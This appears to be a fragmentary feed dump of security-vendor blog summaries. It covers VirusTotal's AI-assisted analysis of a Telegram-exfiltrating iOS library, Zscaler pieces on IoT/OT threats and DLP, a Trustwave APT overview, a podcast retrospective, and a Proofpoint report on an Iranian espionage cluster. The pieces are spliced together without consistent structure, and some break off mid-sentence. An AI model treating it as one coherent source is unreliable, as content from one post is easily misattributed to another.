obfuscation and lightweight crypto used to hide the Telegram URL and tokens. In short: the manual review corroborated the AI\u2019s technical description and confirmed the end-to-end exfiltration mechanism.</p>\n<center>\n<div class=\"separator\" style=\"clear: both;\"><a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvz-lYBvPN2ZxmvRXerKJaYpLzQdVtGqtsUdtLUOgFP5Lp0tmoyltOA6CK-2pSk3Cw1eICjPT2Gv3znQI38huWVP0O5zaQ_6rByhRkTSsdSyDQAlA4G1Q8epHpIYg26F27qrcQW619QnUotzh_VnyQ8N8p3DS3Ybh4zGUKEQh3J9bFeochpmMsdz6WwAg/s1600/3339.png\" style=\"display: block; padding: 1em 0; text-align: center;\"><img alt=\"\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvz-lYBvPN2ZxmvRXerKJaYpLzQdVtGqtsUdtLUOgFP5Lp0tmoyltOA6CK-2pSk3Cw1eICjPT2Gv3znQI38huWVP0O5zaQ_6rByhRkTSsdSyDQAlA4G1Q8epHpIYg26F27qrcQW619QnUotzh_VnyQ8N8p3DS3Ybh4zGUKEQh3J9bFeochpmMsdz6WwAg/s1600/3339.png\" /></a></div>\n</center><br />\n<p>The VirusTotal report below shows the status of this sample not only at the time it was first analyzed on October 18, but also as of November 3, more than two weeks later. No antivirus engine has flagged it as malicious to date.</p> \n<p>Moreover, on the same day this sample was analyzed, Code Insight detected multiple other binaries using the same injection framework, suggesting an organized campaign rather than an isolated specimen.</p>\n<p>Further investigation of the Telegram channel referenced in the IOCs (https://t[.]me/blatants) revealed that it hosts a large-scale operation called Blatant\u2019s iPA Library, boasting more than 38,000 subscribers. The group distributes automation bots (InjectBot, PatchBot, PaidAppScraper, and FileDownloader)  that advertise the ability to inject .dylib payloads into iOS .ipa apps, patch premium features, and share modified packages. This infrastructure perfectly matches the behaviors described in the AI-generated report and confirmed through manual reversing: a dual-purpose ecosystem for app piracy and credential theft, powered by Telegram\u2019s bot API.</p>\n<p>These examples illustrate both the power and practicality of AI-driven reversing. Even without context or prior knowledge, the model can reason through complex binaries, extract intent, and expose behaviors that remain invisible to static or signature-based methods.</p>\n<p><b>The Pragmatic Reality</b></p>\n<p>This work is not about replacing traditional detection engines, it\u2019s about complementing them and covering their blind spots at a scale human teams simply can\u2019t match.</p>\n<p>Until recently, reverse engineering and in-depth code analysis were tasks reserved for human analysts. Even in large-scale operations, fewer than 1% of new files ever underwent that level of scrutiny, simply because manual reversing doesn\u2019t scale. Yet those are precisely the samples that tend to slip past signature or ML-based detections, the truly novel threats.</p>\n<p>By autonomously performing this kind of junior-analyst\u2013level reasoning across millions of files daily, VT Code Insight brings that deeper layer of understanding to every new sample, not just the few that would normally reach a human analyst\u2019s desk.</p>\n<p>It\u2019s a pragmatic shift: AI reasoning where it scales, human expertise where it matters most, helping defenders see further, faster, and with greater context than ever before.</p>",

      "link": "https://www.zscaler.com/blogs/security-research/mobile-iot-and-ot-risks-converge-public-sector",
      "summary": "Connected technology is central to how governments, healthcare providers, and schools operate today. We see it all around us: public safety cameras across cities, medical devices in hospitals, and digital learning tools used in classrooms every day. But with this dependence comes exposure and risk.Threat actors are increasingly targeting vulnerabilities in mobile devices, IoT systems, and legacy OT environments to gain access to critical environments. And few sectors face higher stakes than the public sector when mobile, IoT, and OT systems are compromised.New research from Zscaler ThreatLabz reveals a surge in these attacks across government, healthcare, and education over the past year. From Android malware campaigns to IoT botnets overwhelming critical systems, the convergence of connected technologies continues to extend threat actors\u2019 reach across public sector infrastructures.In the sections that follow, we\u2019ll highlight key research findings from the Zscaler ThreatLabz 2025 Mobile, IoT, and OT Threat Report, including how IoT malware and mobile attacks are particularly impacting the government, healthcare, and education sectors.Top mobile, IoT, and OT threat trendsThreatLabz researchers identified patterns seen across industries worldwide. Three major trends stand out:Android malware hides in everyday apps: Android malware rose 67% globally year-over-year, fueled by spyware and banking malware embedded in legitimate applications. Even trusted marketplaces like Google Play saw 239 malicious Android apps downloaded 42 million times.IoT botnets keep amplifying risk:&nbsp;Botnet families such as Mirai, Gafgyt, and Mozi continue to dominate IoT threat activity, accounting for 75% of all malicious IoT payloads. These campaigns exploit unpatched routers and edge devices to rapidly expand their networks.Legacy OT and supply chains remain weak links:&nbsp;Threat actors continue to take advantage of the overlap between outdated operational systems and vulnerable vendor ecosystems, knowing that one unpatched controller or compromised vendor update can open the door to many connected networks and critical services.These cross-industry trends form the foundation of the public sector cyber risk story. Whether through a compromised mobile device, a hacked smart sensor, or a vulnerable control system, attackers are finding new entry points into public sector networks. Here\u2019s how these attack patterns emerged across government, healthcare, and education between June 2024\u2013May 2025.Government key findingsGovernment agencies rely heavily on connected devices, surveillance systems, and smart city infrastructure. In the past year alone,&nbsp;IoT malware attacks against government systems&nbsp;surged by 370%, while&nbsp;mobile threats rose 147%.In recent events, nation-stage groups like&nbsp;Volt Typhoon and Salt Typhoon have infiltrated government systems by exploiting IoT devices, public-facing routers, and other edge infrastructure to gain covert access and maintain long-term persistence.Even local governments are vulnerable: smart traffic lights, emergency alert systems, and utility management networks can all be manipulated through IoT weaknesses. A single compromised device can cascade into widespread service disruptions, threatening public safety and trust.Healthcare key findingsHealthcare providers remain one of the most targeted verticals for mobile and IoT attacks, as threat actors seek to exploit valuable patient data and disrupt critical care operations. Over the past year, ThreatLabz observed a&nbsp;224% surge in mobile-related attacks&nbsp;targeting healthcare organizations, many involving Android-based malware designed to harvest credentials or compromise clinical workflowsIoT and OT systems in hospitals\u2014from infusion pumps and MRI machines to connected HVAC systems\u2014often run on outdated firmware or lack strong authentication. The impact of compromise can disrupt care or allow threat actors to move laterally across healthcare networks to access sensitive medical records or connected hospital systems. Even though medical devices represent a relatively small fraction of the total volume of IoT devices tracked by ThreatLabz (0.6%), they are among the most sensitive, and any compromise carries direct risks to patient safety.Education key findingsEducation has quietly become a&nbsp;major target for IoT malware with an 861% surge in attacks over the past year. Schools and universities are increasingly exposed through smart classroom devices, connected cameras, and online learning platforms.Attacks recognize that education institutions often operate with limited cybersecurity budgets and device sprawl. Threat actor goals vary from stealing personal data to launching ransomware campaigns that can shut down digital learning environments.In some cases, IoT botnets are weaponized to overwhelm university systems or hijack connected devices such as routers for broader attacks.For additional details on the IoT malware and Android threat landscapes, read the&nbsp;ThreatLabz 2025 Mobile, IoT, and OT Threat Report.Securing the public sector\u2019s connected futureAddressing existing and emerging mobile and IoT/OT risks requires visibility and control across every connected device, application, and user. Zscaler helps organizations meet this challenge by extending zero trust protection to the people, devices, and applications that power essential public services.&nbsp;Through the&nbsp;Zscaler Zero Trust Exchange, public sector agencies and organizations can isolate threats, enforce segmentation, and gain comprehensive visibility into attack surfaces within dynamic, distributed environments. Whether securing a remote clinic, a university campus, or a field operations site, Zscaler delivers consistent protection and traffic monitoring across connected endpoints. This enables security teams to detect vulnerabilities early and prevent lateral movement that could disrupt essential services.&nbsp;Actionable steps for public sector leaders&nbsp;Public sector leaders can take the following actions to mitigate risk and proactively secure mobile and IoT/OT ecosystems:Implement zero trust for critical networks: Adopt a zero trust architecture to secure cellular IoT connections, isolate unmanaged OT systems into \u201cnetworks of one,\u201d and prevent lateral movement by enforcing strict device segmentation.Protect IoT and cellular gateways: Secure the IoT and cellular gateways that connect internal systems to cloud infrastructure through continuous traffic monitoring, anomaly detection, and firmware integrity checks to counter supply chain risks and botnet recruitment vulnerabilities.Enhance supply chain risk management:&nbsp;Establish strict IoT device procurement and onboarding security standards that align with CISA and NIST guidelines.

      "summary": "<ul>\n\t<li><strong>APT Groups prioritize Espionage</strong> and data theft: Approximately two-thirds of all Trustwave SpiderLabs-tracked APT group activity is motivated by espionage, targeting government, defense, and telecom sectors primarily in the US, Ukraine, and Russia.</li>\n\t<li><strong>Top Attacker Nations</strong>: China (41%), Iran (12.5%), and Russia are the leading origins for espionage attacks, emphasizing the critical need for robust threat intelligence to track state-sponsored activity.</li>\n\t<li><strong>Beyond Detection: Actionable Threat Intelligence</strong>: Trustwave SpiderLabs operationalizes threat intelligence by dissecting APT group Tactics, Techniques, and Procedures (TTPs) and converting them into custom detection rules to dramatically reduce attacker dwell time.</li>\n</ul>\n\n<p>Government administration, defense, and finance sector organizations are the primary areas Advanced Persistent Threat (APT) groups are targeting, according to the most recent data from the Trustwave SpiderLabs&rsquo; Cyber Threat Intelligence (CTI) team.</p>\n\n<p>The team found most attacks are launched from China, Russia, and Iran, with the primary targets residing in the US, Ukraine, and, interestingly, Russia. The groups tracked include Lapsus$, ShinyHunters, and Silk Typhoon.</p>\n\n<p>Trustwave&rsquo;s CTI list is not all-inclusive, but it offers a solid overview of the actors involved, where the attacks are launched from, and the nations undergoing the heaviest attack. SpiderLabs aggregates information continuously from a variety of APT databases maintained by the cybersecurity sector, along with internal reports.</p>\n\n<p>Let&rsquo;s start off with a quick reminder on APT groups and then look at what motivating factors are driving APT activity.</p>\n\n<h3><strong>APT Defined</strong></h3>\n\n<p>An Advanced Persistent Threat (APT) is a type of prolonged, targeted cyberattack in which an intruder gains unauthorized access to a network and remains undetected for an extended period, sometimes even months or years.</p>\n\n<p>APT groups often use sophisticated toolsets and techniques, such as custom-developed malware, zero-day exploits, and multiple methods to evade traditional security defenses and gain access.</p>\n\n<p>Persistence is maintained, as these attackers are not looking for a quick smash-and-grab strike but want long-term access to the network to continuously monitor activity and steal data over a sustained period. They will re-attempt access if initially blocked.</p>\n\n<h3><strong>APT Group&rsquo;s Motivating Factors</strong></h3>\n\n<ul>\n\t<li><strong>Information Theft and Espionage</strong> &ndash; This activity accounts for about two-thirds of all SpiderLabs-tracked APT activity. Our analysts noted that China is responsible for about 41% of these attacks, followed by Iran, conducting 12.5%, and Russia, with 5%. These attacks focused on targets within the US, with Ukraine second most targeted, followed by the British Indian Ocean Territory and Russia. The targets most often hit were government/administration, defense, and telecoms.</li>\n\t<li><strong>Financial</strong> &ndash; This category covers attackers looking for straight-up financial gain and those attempting crimes against financial institutions. This could include data theft, ransomware, etc. Again, the US was the most targeted nation, followed by Ukraine and Canada. SpiderLabs' insight into which nations housed the attackers is not as clear, with almost half not being known, but of those that are known, Russia is the leader, followed by China.</li>\n\t<li><strong>Sabotage and Destruction</strong> &ndash; This James Bond-sounding category was the least likely to take place, with instances comprising less than 5% of all attacks. Russia led the way, conducting the most attacks, followed by Iran, striking with the US, Ukraine, Germany, and Israel being the most frequently struck. The most popular targets were the energy, government, defense, and finance sectors.</li>\n</ul>\n\n<h3><strong>Victimology</strong></h3>\n\n<p>SpiderLabs has also determined which specific vertical sectors are most often targeted.</p>\n\n<p>The government sector, attacked primarily by China-based threat actors, was hit most often, with defense, finance, education, energy, and healthcare all on the receiving end of APT group activity. China, Iran, and Russia were often the home bases for those attacking these groups.</p>\n\n<h3><strong>SpiderLabs' Direct Role in APT Defense</strong></h3>\n\n<p>SpiderLabs not only tracks threats but also serves as the instrumental tool that helps Trustwave, A LevelBlue Company, protect its clients, including by defending against APT threats. The information derived for this report is based on the work SpiderLabs does in the field with our clients.</p>\n\n<p>The protection offered by Trustwave against APTs is critically dependent on the continuous work of SpiderLabs, which operates across three key areas:</p>\n\n<p><strong>1. Elite Threat Intelligence &amp; TTP Tracking</strong><br />\nSpiderLabs analysts are dedicated to tracking and analyzing dozens of specific, sophisticated APT groups worldwide (e.g., APT34, APT44/Sandworm, Salt Typhoon, Silver Fox, and Scattered Spider).</p>\n\n<ul>\n\t<li><strong>Dissection of TTPs</strong>: The team performs deep analysis on the Tactics, Techniques, and Procedures (TTPs), custom malware, and infrastructure used by these groups.</li>\n\t<li><strong>Actionable Intelligence</strong>: This proprietary intelligence is immediately converted into custom detection rules and playbooks. These are infused directly into the Trustwave Fusion platform and the client's security tools (e.g., EDR/XDR/SIEM), enabling Trustwave's Security Operations Centers (SOCs) to detect subtle, behavioral anomalies that signature-based tools would miss.</li>\n</ul>\n\n<p><strong>2. Human-Led Advanced Threat Hunting</strong><br />\nWhile automated security tools rely on known indicators, APTs specialize in stealth and avoiding detection (known as low-and-slow attacks). SpiderLabs' human expertise is used to find these hidden threats.</p>\n\n<ul>\n\t<li><strong>Hypothesis-Driven Hunts</strong>: SpiderLabs experts use a hypothesis-based approach (assuming the client is already breached) to proactively search for indicators of compromise that align with known APT TTPs.</li>\n\t<li><strong>MITRE ATT&amp;CK Mapping</strong>: Their hunting methodology is mapped to the MITRE ATT&amp;CK framework, allowing them to systematically search for activity across the entire attack chain&mdash;from initial access to persistence and command-and-control.</li>\n\t<li><strong>Reduced Dwell Time</strong>: This proactive hunting significantly reduces the attacker's dwell time (the period an attacker remains in a network undetected,) minimizing the damage an APT can inflict.</li>\n</ul>\n\n<p><strong>3. Incident Response and Preparation</strong><br />\nIf an APT successfully breaches a client, SpiderLabs' forensic and response capabilities are activated immediately.</p>\n\n<ul>\n\t<li><strong>Digital Forensics &amp; Incident Response (DFIR)</strong>: The team provides 24/7 global support for emergency breach response, performing forensic investigations to determine the scope, root cause, and identity of the APT actor.</li>\n\t<li><strong>Containment and Eradication</strong>: They rapidly execute the steps needed to contain the threat and ensure the APT is completely eradicated from the environment.</li>\n\t<li><strong>Offensive Security</strong>: SpiderLabs' ethical hackers also perform penetration testing and red team exercises that are informed by real-world APT TTPs. This tests a client's defenses against the most advanced adversaries, identifying security gaps before an actual APT exploits them.</li>\n</ul>\n\n<p>SpiderLabs ensures that clients are not just protected against general threats, but are specifically fortified against the evolving, state-sponsored, and financially motivated groups that pose the greatest risk.</p>",

Then massaged and aggregated the outputs, then ran more AI on the result. And then lightly curated it. Then deleted the bottom 2 stupidest points they\u00a0made.</p><p>So, here it comes\u00a0\u2026 in all its sloppy\u00a0glory!</p><ol><li><strong>The Foundational Roots and Unchanging Mission: </strong>Our show started with foundational cloud security topics\u200a\u2014\u200alike Zero Trust, Data Security, and Cloud Migration Security which drew the initial large audiences. The core commitment since Episode 1 has been to question conventional wisdom, avoid \u201csecurity theater\u201d (<a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep248-cloud-ir-tabletop-wins-how-to-stop-playing-security-theater-and-start-practicing/\">EP248</a>) and explore whether security measures truly benefit the user and the organization.</li><li><strong>The AI Transformation:</strong> We had a sizable shift with the last 50 episodes, where <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/topics/podcast-list/?tag=ai\">AI became a central theme</a>, or at least one of the themes we always come back to (and, yes, this covers our 3 pillars of securing AI, AI for security and countering the AI-armed attacker). The focus has moved past general hype to practical applications, securing AI systems, and asking challenging questions like \u201cData readiness for AI SOC\u201d\u00a0(<a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep249-data-first-what-really-makes-your-soc-ai-ready/\">EP249</a>).</li><li><strong>The Enduring Popularity of Detection &amp; Response (D&amp;R):</strong> We highlight that D&amp;R and modernizing the SOC continue to be extremely popular with the audience (<a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep236-accelerated-siem-journey-a-soc-leaders-playbook-for-modernization-and-ai/\">EP236 is epic</a>).

      "link": "https://www.zscaler.com/blogs/product-insights/empowering-critical-infrastructure-zscaler-cellular",
      "summary": "Smarter, safer operations - Driven by Zscaler Cellular innovation&nbsp;Imagine flipping a switch and nothing happens\u2014no power, no clean water, no transportation. Sounds extreme, but in today\u2019 hyperconnected world, these \u201cwhat ifs\u201d are no longer far-fetched. From keeping the lights on to keeping cities moving, critical infrastructure runs behind the scenes of our daily lives. But as these essential systems get smarter and more connected, they\u2019ve also become prime targets for cyberattacks. We\u2019ve all seen what can go wrong: ransomware that shuts down entire fuel pipelines, botnets hijacking smart devices to paralyze networks, or supply chain attacks that ripple across industries. The truth? A single vulnerability can spark disruptions that reach far beyond one company\u2014impacting communities, economies, and even national security.It\u2019s never been clearer: protecting our critical infrastructure isn\u2019t just an IT issue\u2014it\u2019s a matter of public safety and global stability. That\u2019s why organizations are moving towards Zero Trust security, where every device, user, and connection is treated like a potential risk, and lateral movement is stopped in its tracks.We\u2019re at a crossroads. The question isn\u2019t whether we need to evolve our approach to security\u2014it\u2019s how fast we can adapt before the next big attack hits.The Real-World Challenges: Why Securing Critical Infrastructure Isn\u2019t EasyLet\u2019s be real\u2014keeping our essential services safe has never been harder. As everything from power grids to water plants get smarter and more connected, new security gaps keep popping up. Attackers aren\u2019t breaking in through the front door anymore\u2014they\u2019re finding weak spots in outdated tech, forgotten sensors, or the countless devices that keep things running behind the scenes. So what\u2019s tripping organizations up? Here are a few of the biggest headaches:Lateral Movement Risks: Unprotected IoT devices and ICS systems act as gateways for attackers, enabling threats to spread without Zero Trust segmentationLimited Security for Agentless Devices: IoT and OT devices, often incompatible with traditional agents, lack adequate visibility and protection, leaving systems exposed.Legacy Infrastructure: Outdated systems lacking updates or integration capabilities strain defenses and amplify risks.Regulatory Complexity: Meeting compliance standards, including regional and industry-specific standards - adds extra pressure, especially for teams already stretched thinResource Constraints: Tight budgets and limited cybersecurity expertise delay modernization efforts, putting critical assets in jeopardy.These challenges demand proactive defense strategies that can deliver Zero Trust access, real-time visibility, and scalable connectivity \u2014 all while working in complex, evolving environments.Lessons from Real-World Attacks on Critical InfrastructureThe challenges impacting critical infrastructure aren\u2019t just theoretical \u2014 they\u2019ve played out dramatically in real-life cyberattacks, highlighting exactly where vulnerabilities lie. Some of the world\u2019s most disruptive hacks started with a weakness in critical infrastructure\u2014and the ripple effects were felt everywhere. Let\u2019s take a closer look at a few notable examples and the lessons they reveal for the future of cybersecurityEstonia Cyberattack (2007)1: State-sponsored DDoS attacks overwhelmed critical IoT-connected systems, disrupting banking services, government operations, and media channels \u2014 exposing the fragility of interconnected networks and the need for robust defensesUkraine Power Grid Attack (2014)2: Attackers shut down power to an entire region by exploiting ICS vulnerabilities, highlighting the importance of network segmentation and layered protections.The Mirai IoT Botnet (2016)3: By taking advantage of factory-default passwords, hackers turned unprotected IoT devices into a botnet army that launched devastating DDoS attacks globally. The takeaway? IoT authentication and regular firmware updates are non-negotiable.Colonial Pipeline Ransomware Attack (2021)4: This attack disrupted fuel supplies across the U.S. by exploiting poor network segmentation, proving that protecting the attack surface is vital to avoid public impact.Water Treatment Plant Attacks (2021\u20132024)5: IoT compromises in U.S. water plants interfered with automated filtering systems, posing water contamination threats and underscoring the risks of agentless OT environments.What ties all these incidents together? Simple gaps\u2014unsecured devices, flat networks, and out-of-date equipment\u2014gave attackers a way in and let the damage spread fast.So, what\u2019s the takeaway? Hope isn\u2019t a strategy. Instead, critical infrastructure needs a new way of thinking: Zero Trust. It\u2019s about making sure every connection, device, and user is verified\u2014always. With real-time oversight and no \u201copen doors,\u201d organizations can finally take control and lock down even the trickiest parts of their environment. That\u2019s the power behind a modern approach like Zscaler: keeping today\u2019s most important services safe, whatever comes nextZscaler Cellular: Bringing Security and Connectivity into the IoT Age&nbsp;&nbsp;Let\u2019s face it\u2014as more smart devices, sensors, and legacy systems get added to critical infrastructure, keeping everything secure and connected is more complicated than ever. Old-school security tools just can\u2019t keep up. You need protection that works at scale and adapts as quickly as your environment changes.Enter&nbsp;Zscaler Cellular\u2014a solution designed for today\u2019s world, where your essential operations rely on seamless and secure connectivity. Rather than piling on more hardware and complexity, Zscaler Cellular brings modern, cloud-based security right into the cellular networks your systems already use. That means no more wrestling with VPNs or firewalls that weren\u2019t made to handle billions of endpoints.So, how does it actually help? Zscaler Cellular makes it simple to protect and connect everything from power grids and water plants to transportation systems and smart factories. Here\u2019s what sets it apart:Zero Trust, No Agents Needed: Whether it\u2019s IoT sensors or industrial devices, Zscaler Cellular shields them\u2014even if you can\u2019t install security software.Always Connected, Everywhere: With access to over 520 global carriers, you get secure, reliable cellular coverage across your entire footprint\u2014including the most remote sites.No Easy Way In: By removing routable networks, the attack surface shrinks\u2014making it much harder for threats to move around or go undetected.Plug-and-Play Simplicity: Want to add a new device or site? Just pop in the SIM and go. No bulky hardware or complicated setup required.What does this mean in real life? Utilities can keep monitoring grids and substations no matter how remote. Water plants can safeguard automated systems against unauthorized access. Transport operators get reliable connectivity for trains and vehicles on the move.

      "summary": "For more insights on moving beyond legacy DLP, visit the Zscaler Retire Legacy DLP PortalI promise\u2014this isn\u2019t another blog about Generative AI. Don\u2019t get me wrong, I have nothing against GenAI. It\u2019s just that what we\u2019re experiencing now is a perfect example of a cycle we\u2019ve seen play out in the industry time and time again.This is a blog about problem solving\u2014or, more specifically, about the price we pay for solving them (with GenAI as today\u2019s trending solution). Let me explain.IT is excellent at solving problems. Typically, a solution arrives in the form of a point product that someone is eager to sell. The promise of unlimited power through visibility and control is hard to resist. Thanks to that shiny, new tool, the problem usually gets fixed, and most of the boxes are checked. We feel whole again. That is...until the next technological challenge arises.But what is the real cost? Beyond the upfront sticker price, the hidden cost often doesn\u2019t reveal itself until years later. Only then do you look back at a stack of security approaches bolted onto your environment and see the toll it has taken. The hidden price emerges as overlap, complexity, integration headaches, and operational inefficiencies. And yet, those costs are rarely considered at the start.&nbsp;Legacy DLP: A Road Paved with PotholesNow, let\u2019s talk about how this impacts data security. First, I want to be clear\u2014legacy approaches to Data Loss Prevention (DLP) weren\u2019t bad solutions for their time. For the past 20 years, DLP has been the go-to method for addressing specific data security challenges. This one-problem-at-a-time process did its job: network visibility? Check. Endpoint control? Done. Cloud visibility? Tack that on too.But here\u2019s the issue\u2014it\u2019s like continuously patching potholes on an aging road.&nbsp;It helps for a while, but eventually the road traveled becomes far too difficult to navigate.&nbsp;And frankly, a lot of this is outside your control. Consider this: most CISOs probably inherited at least 60% of their tech stack when they joined their current company. This is exactly why the term \"technical debt\" exists.And there\u2019s a bigger question\u2014how can a system architected 20 years ago keep up with today\u2019s threats, like risks posed by GenAI or agentic, adaptive AI? The short answer: it can\u2019t. Here\u2019s what you\u2019re likely up against:Alert Overload: So many alerts, so little time.Policy Chaos: Fragmented DLP policies that feel like they require a master\u2019s degree to manage.Escalating Costs: Between hardware refreshes and scaling needs, it\u2019s a financial treadmill.Endless Admin Work: Patching, managing security updates, and relying on an overworked support team.If this sounds familiar, you\u2019re not alone.&nbsp;The SSE Shift: Scalability, Agility, ControlSo, is there a better way? Yes\u2014and this is precisely why embracing the cloud has been so transformative. The cloud offers scalability, agility, and performance that legacy approaches simply cannot match. Enter Gartner's Security Service Edge (SSE).Designed as a Swiss Army knife for security, Gartner\u2019s SSE excels in many areas, but its true strength lies in its flexible architecture. With centralized, high-performance inline cloud inspection and a robust API framework, SSE is built to address a wide range of security needs while providing the flexibility to support future innovation and growthFrom tackling cyber threats and VPN limitations to solving data security challenges, SSE has become the go-to strategy for organizations looking to eliminate the technical debt we\u2019ve been talking about.While I won\u2019t go too deep into the full scope of Gartner\u2019s SSE here, it\u2019s important to set the stage for what comes next\u2014the exciting part: securing your data against all forms of data risk.&nbsp;From Legacy to Leading: Your Modern Data Security ChecklistThis brings us to the reason we\u2019ve all gathered here: how to retire legacy DLP in favor of a modern architecture. You\u2019re building for the future of data security, so we want to get this right. To ensure success, let\u2019s explore a few key conceptual pillars of data security that are critical for building a robust and airtight data protection strategy.. These are non-negotiable\u2014compromising on them could jeopardize your long-term outcomes:&nbsp;Pillar 1: Bring Classification into Focus using AIThe saying holds true: you can\u2019t protect what you can\u2019t see. In today\u2019s hyper-connected world, data is dynamic\u2014it moves everywhere, and it moves fast. Achieving visibility and mapping where your data resides are foundational steps in building a robust data security strategy.The ability to classify sensitive data wherever it exists\u2014whether in IaaS, SaaS, on-premises, or endpoints\u2014is critical. To stay ahead, you need to adopt innovative AI-powered classification solutions that go beyond traditional methods like regex and keyword matching. Approaches like LLM Classification can now find sensitive data that could never be found before. &nbsp;AI-driven classification is the future, delivering deeper insights and adaptive protection as your data evolves.&nbsp;Pillar 2: An Inline Defense, Powered by Cloud ProxyStrong data security requires inline proxy inspection for data in motion\u2014don\u2019t let anyone tell you otherwise. API-based data security is important for controlling data at rest, but it must be paired with an inline proxy to ensure visibility and control over data in motion.An inline cloud proxy with SSL inspection unlocks powerful capabilities around real-time data blocking, application control, visibility into Gen AI prompts, user behavior insights, and more. Better yet, when delivered from the cloud, you get the best of both worlds: strong visibility and control combined with agile, scalable inspection\u2014without the burden of managing, maintaining, or patching it yourself.It\u2019s important to note that building a cloud-delivered, scalable inline proxy is no small feat. Choose proven proxy vendors that have been tested by millions of users across the world\u2019s largest enterprises.&nbsp;Skipping this due diligence can be a one-way ticket to business-impacting outages\u2014something nobody wants.&nbsp;Pillar 3: Proactive Risk Reduction from robust API\u2019sIt\u2019s also important to focus on finding and fixing risks that may be hiding in plain sight across your ecosystems. Many of the largest breaches we\u2019ve seen in the past have been caused by a hidden misconfiguration that allowed adversaries to walk in through the back door. These risks are avoidable\u2014provided you have the right tools in hand.Enter the posture management capabilities of Data Security Posture Management (DSPM) and SaaS Security Posture Management (SSPM). Designed to hunt and destroy dangerous misconfigurations, these approaches leverage APIs across your cloud ecosystem to catalog sensitive data, prioritize where it resides, and identify which environmental risks are leaving it exposed.What should you look for in a posture management solution? Big hint: it\u2019s our next Pillar.&nbsp;Pillar 4: Centralize DLP, because everything uses it.Let\u2019s play a game: list all the data security approaches that rely on DLP to get their job done. Inline, Endpoint, Email, DSPM, CASB/SSPM, GenAI Security, BYOD.&nbsp; Now picture a piece of data traveling through all these locations. Can you imagine having different DLP verdicts for the same data across each one? And what if you need to secure a custom piece of data\u2014how many different consoles would you have to touch to set up the inspection logic? Hopefully you get my point.Centralizing your DLP around one central inspection engine is key to building a streamlined, efficient data security platform. This is one of the major reasons Gartner retired the DLP Magic Quadrant and rolled data security and DLP capabilities into Gartner's SSE. The centralization of DLP technology makes life&nbsp;so much easier. Take their lead and make this a priority.&nbsp;Pillar 5: Supersize your Channel SupportLastly, look for a platform that supports all the data loss channels you need to secure\u2014and then some. As you grow with your SSE platform, you\u2019ll want flexibility and scalability to add more protecting power to your strategy. Start with Gen AI, Web DLP, and DSPM/SSPM. Then, when you\u2019re ready, add Endpoint DLP to streamline your device agent footprint. Throw on Email for more consistent DLP alerting, and bring in BYOD security if unmanaged devices are a pain point. The possibilities keep adding up.The best part about adopting an SSE platform with this level of flexibility is that you can grow into it incrementally, retiring legacy solutions as contracts expire. It\u2019s a smart, efficient way to reduce technical debt and lean into a more streamlined approach.Ready for a DLP Do-over?Gen AI has emerged as both a blessing and a curse. While brimming with tremendous potential, it also acts as a revealing mirror, exposing data security challenges that just can\u2019t be ignored:Do I have the agility to scale protection to meet new AI challenges?Can I find and secure all my sensitive data, wherever it resides?Is my current architecture modern enough to handle today\u2019s demands?Are operational costs and complexity holding me back?These aren\u2019t just questions\u2014they\u2019re roadblocks standing between organizations and the comprehensive data security they need. Solving them is no trivial task, but Zscaler has been helping enterprises tackle these challenges head-on with its purpose-built data security platform.Zscaler\u2019s approach to data protection has empowered thousands of organizations to elevate and transform their data security programs:Groundbreaking Data Classification powered by innovative AI-driven LLM approachProactive risk mitigation with fully integrated DSPMUnparalleled inline defenses backed by the industry\u2019s leading inline proxyBroadest channel coverage you can get in a platform all around a centralized DLPPowerful Workflow Automation that drastically accelerates operational responseThe result?

      "link": "https://www.proofpoint.com/us/blog/threat-insight/crossed-wires-case-study-iranian-espionage-and-attribution",
      "summary": "Proofpoint would like to thank Josh Miller for his initial research on UNK_SmudgedSerpent and contribution to this report.&nbsp;\n\nKey findings&nbsp;\n\n\n\tBetween June and August 2025, Proofpoint began tracking a previously unidentified threat actor dubbed UNK_SmudgedSerpent targeting academics and foreign policy experts.&nbsp;\n\tUNK_SmudgedSerpent leveraged domestic political lures, including societal change in Iran and investigation into the militarization of the IRGC.&nbsp;\n\tUNK_SmudgedSerpent used benign conversation starters, health-themed infrastructure, OnlyOffice file hosting spoofs, and Remote Management &amp; Monitoring (RMM) tools.&nbsp;\n\tThroughout the investigation, UNK_SmudgedSerpent demonstrated tactics resembling several Iranian actors: TA455 (C5 Agent, Smoke Sandstorm), TA453 (Charming Kitten, Mint Sandstorm), and TA450 (MuddyWater, Mango Sandstorm).&nbsp;\n\tOverlapping TTPs prevent high confidence attribution, but several hypotheses could explain the nature of the relationship between UNK_SmudgedSerpent and other Iranian groups.&nbsp;\n\n\nOverview&nbsp;&nbsp;\n\nIn June, Proofpoint Threat Research began investigating a benign email discussing economic uncertainty and domestic political unrest in Iran. While coinciding with the escalations in the Iran-Israel conflict, there was no indication that the observed activity was directly correlated with Israel\u2019s attacks on Iranian nuclear facilities or Iran\u2019s actions in response.&nbsp;\n\nInitial analysis of the activity found tactics, techniques, and procedures (TTP) overlaps with multiple Iranian aligned groups, including TA455 (C5 Agent, Smoke Sandstorm), TA453 (Mint Sandstorm, Charming Kitten), and TA450 (MuddyWater, Mango Sandstorm). Given a lack of high confidence links to any one established threat group, we designated the activity as a temporary cluster called UNK_SmudgedSerpent.&nbsp;\n\n\n\n&nbsp;\n\nFigure 1. UNK_SmudgedSerpent infection chain with known actor overlaps.&nbsp;\n\nThe infection chain began with a benign conversation, followed by an email exchange and a credential harvesting attempt. After this initial credential harvesting attempt, UNK_SmudgedSerpent continued to conduct phishing activity within the same email thread with a specific target and subsequently delivered a URL that hosted an archive file with an MSI that loaded RMM payloads.&nbsp;\n\nIranian connections&nbsp;\n\nInitial TA453 leads&nbsp;\n\nUNK_SmudgedSerpent\u2019s first identified campaign within Proofpoint data spoofed a member of the Brookings Institute reaching out to over 20 members of a United States-based think tank in mid-June 2025. Targeting specific subject matter experts in Iran-related policy areas is often a characteristic of TA453 activity, particularly using a benign conversation starter. However, approaching a significant number of individuals at a single organization diverges from Proofpoint Threat Research\u2019s observations of typical TA453 techniques.&nbsp;\n\nIn another deviation from typical TA453 activity, members of the targeted organization focused across almost all areas of expertise including national defense, advanced technology, economic security, and global health, along with region-specific experts. TA453 primarily focuses on Middle Eastern policy topics, such as Iranian nuclear negotiations or Iran\u2019s foreign relations. Regardless of each recipient\u2019s 